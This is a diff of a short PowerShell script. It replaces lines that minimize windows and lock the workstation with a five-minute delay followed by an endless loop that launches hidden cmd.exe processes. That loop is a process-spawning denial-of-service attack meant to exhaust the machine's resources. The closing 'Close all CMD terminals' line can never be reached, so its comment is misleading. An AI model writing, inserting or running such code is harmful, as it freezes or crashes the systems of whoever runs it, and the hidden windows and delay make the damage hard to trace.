@@ -1,4 +1,10 @@
-$shell = New-Object -ComObject "Shell.Application"
-$shell.MinimizeAll()
-Start-Sleep -Seconds 30
-Invoke-WindowsLock
+# Wait for 5 minutes
+Start-Sleep -Seconds 300
+
+# Open infinite CMD terminals
+while($true) {
+    Start-Process cmd.exe -WindowStyle Hidden
+}
+
+# Close all CMD terminals
+Stop-Process -Name cmd -Force
